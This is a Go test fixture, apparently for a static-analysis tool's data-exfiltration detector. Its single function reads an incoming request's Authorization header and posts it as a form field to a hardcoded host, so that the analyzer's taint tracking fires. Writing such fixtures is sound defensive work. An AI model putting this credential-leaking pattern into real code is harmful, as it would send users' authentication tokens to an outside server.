// DATA_EXFIL fixture: a Sensitive (header) source flowing into the form
// payload of `http.PostForm` (arg 1, `url.Values`).  The destination URL
// is hardcoded so SSRF does not fire; only the form-data path activates
// the body-position gate.
//
// Driven by `data_exfil_go_integration_tests.rs`.
package fixture

import (
	"net/http"
	"net/url"
)

func leakAuthHeader(r *http.Request) {
	auth := r.Header.Get("Authorization")
	form := url.Values{"token": []string{auth}}
	http.PostForm("https://analytics.internal/track", form)
}
